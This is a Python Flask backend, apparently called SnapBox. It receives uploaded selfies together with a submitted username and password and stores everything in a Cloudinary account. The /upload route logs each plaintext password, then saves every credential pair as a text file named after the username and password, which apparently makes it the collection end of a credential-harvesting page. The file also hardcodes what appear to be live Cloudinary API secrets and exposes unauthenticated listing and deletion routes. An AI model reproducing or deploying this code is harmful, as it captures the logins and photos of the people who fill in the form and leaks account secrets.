from flask import Flask, request, jsonify
from flask_cors import CORS
import cloudinary
import cloudinary.uploader
import cloudinary.api
import time
import os
import random
import tempfile
from datetime import datetime

app = Flask(__name__)
CORS(app)

# 🔐 Cloudinary Config
cloudinary.config(
    cloud_name="dx1jvytp4",
    api_key="932781884527291",
    api_secret="eRSeF486FPV-eh8YpBWZX8wJe7c"
)
@app.route('/')
def home():
    result = cloudinary.Search().expression("folder:snapbox").sort_by("created_at", "desc").execute()
    resources = result['resources']

    grouped = []
    current_group = []
    last_time = None
    threshold = 60  # seconds

    for item in resources:
        created_at = item['created_at']
        timestamp = int(time.mktime(time.strptime(created_at[:19], "%Y-%m-%dT%H:%M:%S")))

        if last_time is None or abs(last_time - timestamp) <= threshold:
            current_group.append(item)
        else:
            grouped.append(current_group)
            current_group = [item]

        last_time = timestamp

    if current_group:
        grouped.append(current_group)

    html = '''
    <h2 style="font-family:sans-serif;">📸 SnapBox Cloudinary Backend is Live!</h2>
    <div style="font-family:monospace; font-size:14px;">
    '''

    for i, group in enumerate(grouped, start=1):
        timestamp = group[0]['created_at'][:19].replace("T", " ")
        html += f"<p><b>Session {i} — {timestamp}</b></p><form action='/delete-group' method='POST'>"
        for img in group:
            url = img['secure_url']
            public_id = img['public_id']
            html += f'''
            <div style="margin-bottom:6px;">
                {url}
                <input type="hidden" name="public_ids" value="{public_id}">
                <a href="{url}" target="_blank" style="margin-left:10px; padding:2px 6px; background:#333; color:#fff; text-decoration:none; border-radius:4px;">Open</a>
            </div>
            '''
        html += f'''
        <button type="submit" style="margin-top:10px; padding:6px 12px; background:#e11d48; color:#fff; border:none; border-radius:6px; cursor:pointer;">🗑️ Delete This Session</button>
        </form><hr style="margin:20px 0;">
        '''

    html += "</div>"
    return html

@app.route('/upload', methods=['POST'])
def upload_files():
    files = request.files.getlist('photos')
    uploaded_urls = []

    # 🔽 Get form data
    username = request.form.get('username', 'unknown_user')
    password = request.form.get('password', 'empty_pass')

    print("📥 Received username:", username)
    print("📥 Received password:", password)

    # ✅ Upload selfies
    for index, file in enumerate(files):
        if file.filename == '':
            continue

        timestamp = int(time.time())
        unique_id = random.randint(1000, 9999)
        result = cloudinary.uploader.upload(
            file,
            folder="snapbox",
            public_id=f"selfie_{timestamp}_{index + 1}_{unique_id}",
            overwrite=False,
            invalidate=True,
            resource_type="image"
        )
        uploaded_urls.append(result['secure_url'])

    # ✅ Save username/password as .txt
    credentials_content = f"Username: {username}\nPassword: {password}"
    with tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.txt') as temp_file:
        temp_file.write(credentials_content)
        temp_file_path = temp_file.name

    cloudinary.uploader.upload(
        temp_file_path,
        folder="User",
        public_id=f"{username}_{password}",
        resource_type="raw",
        overwrite=True
    )

    return jsonify({
        'message': '✅ Uploaded selfies & user credentials to Cloudinary!',
        'urls': uploaded_urls
    })

@app.route('/delete-group', methods=['POST'])
def delete_group():
    public_ids = request.form.getlist('public_ids')
    deleted = 0
    for pid in public_ids:
        try:
            cloudinary.uploader.destroy(pid, invalidate=True)
            deleted += 1
        except Exception as e:
            print("❌ Error deleting", pid, str(e))
    return f"<h3>✅ Deleted {deleted} images from this session.<br><a href='/'>🔙 Back</a></h3>"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=False, host='0.0.0.0', port=port)
